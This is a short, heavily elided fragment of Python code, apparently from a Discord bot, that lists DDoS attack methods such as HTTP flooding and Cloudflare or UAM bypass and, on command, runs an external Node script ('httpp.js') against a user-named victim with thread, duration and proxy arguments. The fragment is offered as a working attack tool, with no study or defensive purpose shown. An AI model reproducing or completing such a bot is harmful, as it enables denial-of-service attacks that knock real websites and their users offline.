...
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','HTTP-PROXY'] # Methods
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    ...
                    embed.set_footer(text = f"©{year_now} LeQuan.")
                    await ctx.send(embed=embed)
                    system(f'node httpp.js {victim} {thread2} {time2} proxy')
